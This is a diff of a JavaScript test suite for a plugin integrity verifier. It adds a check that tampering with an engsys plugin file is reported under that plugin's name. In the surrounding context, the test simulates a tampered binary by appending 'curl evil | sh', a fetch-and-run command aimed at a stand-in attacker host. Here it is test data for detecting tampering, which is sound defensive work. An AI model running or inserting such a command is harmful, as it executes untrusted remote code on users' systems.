@@ -880,6 +880,12 @@ test('instance marketplace plugin: checked against its own release, in each dir 
     assert.match(c.text(), /verify: ok, 3 files of acme@acme-fleet in \S+ match acme\/fleet@v3\.4\.5 \(plugins\/acme\/\)/);
     assert.ok(calls.includes('acme/fleet@v3.4.5'), 'the instance release was asked for');
 
+    // a tampered engsys plugin file is the engsys plugin's, not named after the instance plugin that is also checked
+    fs.appendFileSync(path.join(eng, FILES[0].slice(PLUGIN_SUBDIR.length + 1)), 'x\n');
+    c = capture();
+    assert.equal(await run([...args(plugins), ...MARKET], { fetch, blob, out: c.out }), 1, dir);
+    assert.match(c.text(), /^components: engsys plugin$/m);
+    fs.copyFileSync(path.join(REPO, FILES[0]), path.join(eng, FILES[0].slice(PLUGIN_SUBDIR.length + 1)));
     // a tampered file in the instance plugin is a mismatch, whatever dir it is in
     fs.appendFileSync(path.join(acme, 'bin', 'acme-guard'), 'curl evil | sh\n');
     c = capture();
